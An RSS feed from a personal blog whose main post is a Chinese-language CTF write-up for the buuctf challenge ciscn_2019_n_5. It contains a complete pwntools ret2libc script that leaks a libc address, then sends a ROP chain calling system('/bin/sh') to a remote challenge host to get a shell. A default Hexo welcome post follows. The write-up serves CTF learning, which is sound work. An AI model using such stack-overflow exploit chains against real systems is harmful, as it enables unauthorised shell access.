<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hyrink&#39;s Blog</title>
        <subtitle>pwn &amp; poet</subtitle>
        <icon>http://example.com/images/favicon.ico</icon>
        <link>http://example.com</link>
        <author>
          <name>Hyrink</name>
        </author>
        <description>I think there I am</description>
        <language>zh-CN</language>
        <pubDate>Mon, 03 Apr 2023 17:16:15 +0800</pubDate>
        <lastBuildDate>Mon, 03 Apr 2023 17:16:15 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/03/pwn/</guid>
            <title></title>
            <link>http://example.com/2023/04/03/pwn/</link>
            <pubDate>Mon, 03 Apr 2023 17:16:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; pwn&lt;/h1&gt;
&lt;h2 id=&#34;stackoverflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#stackoverflow&#34;&gt;#&lt;/a&gt; stackoverflow&lt;/h2&gt;
&lt;h3 id=&#34;ret2libc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2libc&#34;&gt;#&lt;/a&gt; ret2libc&lt;/h3&gt;
&lt;h4 id=&#34;ciscn_2019_n_5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_2019_n_5&#34;&gt;#&lt;/a&gt; ciscn_2019_n_5&lt;/h4&gt;
&lt;p&gt;来自 buuctf：&lt;/p&gt;
&lt;p&gt;首先检查：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402172034111.png&#34; alt=&#34;image-20230402172034111&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现是 64 位，一个保护都没开。所以这里我用了两种做法：1.ret2shellcode    2.ret2libc&lt;/p&gt;
&lt;h5 id=&#34;1ret2shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1ret2shellcode&#34;&gt;#&lt;/a&gt; 1.ret2shellcode&lt;/h5&gt;
&lt;p&gt;先将程序拖进 ida64 查看反汇编：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402180754626.png&#34; alt=&#34;image-20230402180754626&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看 name：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402180926847.png&#34; alt=&#34;image-20230402180926847&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以知道&lt;strong&gt; name&lt;/strong&gt; 在 bss 段，并且有 64 字节可写，于是我们可以往 bss 段写入 shellcode，再用&lt;strong&gt; gets (text)&lt;strong&gt; 返回 bss 段执行&lt;/strong&gt; shellcode&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;所以有&lt;strong&gt; exp&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181618672.png&#34; alt=&#34;image-20230402181618672&#34; /&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;strong&gt; flag&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181724035.png&#34; alt=&#34;image-20230402181724035&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;successful&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h5 id=&#34;2ret2libc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2ret2libc&#34;&gt;#&lt;/a&gt; 2.ret2libc&lt;/h5&gt;
&lt;p&gt;查看反汇编：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181847339.png&#34; alt=&#34;image-20230402181847339&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可知 gets 处有漏洞可以利用&lt;/p&gt;
&lt;p&gt;于是我们有以下思路：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;strong&gt; 由于 puts 已经被调用过，所以&lt;/strong&gt; puts&lt;/strong&gt; 函数的 got 表中存放的已经是 libc 中的真实地址，又由于 4kb 页对齐原理，根据函数地址末三位可以泄露出 libc 的版本，从而获取&lt;strong&gt; system&lt;/strong&gt; 和 **\bin\sh** 的真实地址。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;,arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;node4.buuoj.cn&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;25388&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io= process(&amp;#x27;./ciscn_2019_n_5&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#host = &amp;#x27;node4.buuoj.cn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#port = 25388&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ciscn_2019_n_5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = elf.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = &lt;span class=&#34;number&#34;&gt;0x0400713&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = &lt;span class=&#34;number&#34;&gt;0x04004c9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload_rab = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;											&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;tell me your name\n&amp;#x27;&lt;/span&gt;,payload_rab)  //此处**read**函数用不到所以随意填充垃圾数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)+flat([pop_rdi,puts_got,puts_plt,main])  //通过rdi寄存器传参，将**puts**函数的got表地址打印出来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;What do you want to say to me?\n&amp;#x27;&lt;/span&gt;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u64(io.recv()[:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))   //接收**puts**函数的真实地址(及上面打印出的got表地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                              &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(puts_addr))                              &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#u64(io.recv(6)[:-1].ljust(8,b&amp;#x27;\x00&amp;#x27;))                                              &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(puts_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;,puts_addr)      //利用LibcSearcher工具查询libc版本&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里要注意一点，我一开始接受真实地址用的是  **puts_addr = u64 (io.recv (6)[:-1].ljust (8,b&#39;\x00&#39;))** 接收，一直报错，*timeout: the monitored command dumped core\n&#39; timeout: the monitored command dumped core&#39;* 并且说连接不到端口，整了半天。实际上还是我对于 recv () 这条命令不了解&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;puts_addr = u64(io.recv(6)[:-1].ljust(8,b&#39;\x00&#39;))&lt;strong&gt; 表示接受 6 字节长度，并将其切片，删掉最后一个字节，左对齐用 0 补齐。这样就会导致接收到的&lt;/strong&gt; puts&lt;/strong&gt; 的 got 表地址变化，从而报错。&lt;/p&gt;
&lt;p&gt;泄露 libc 版本之后就好写了：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;libc_base = puts_addr - libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;)   //**计算基地址**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)   //**通过基地址和偏移地址算出system的真实地址**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;str_bin_sh&amp;#x27;&lt;/span&gt;)   //**同上**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(binsh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload_rab)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)+ flat([pop_rdi,binsh,ret,system])  //此处要加一个**ret**进行栈平衡，原因没了解之后会去细看，大致就是因为ubuntu18上的在调用system函数时都要进行栈平衡，防止栈顶被破坏，导致程序崩溃&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行之后：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202536850.png&#34; alt=&#34;image-20230402202536850&#34; /&gt;&lt;/p&gt;
&lt;p&gt;选择‘0‘。&lt;/p&gt;
&lt;p&gt;成功拿到 shell：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202628954.png&#34; alt=&#34;image-20230402202628954&#34; /&gt;&lt;/p&gt;
&lt;p&gt;flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202643138.png&#34; alt=&#34;image-20230402202643138&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/04/02/hello-world/</guid>
            <title>Hello World</title>
            <link>http://example.com/2023/04/02/hello-world/</link>
            <pubDate>Sun, 02 Apr 2023 13:46:48 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
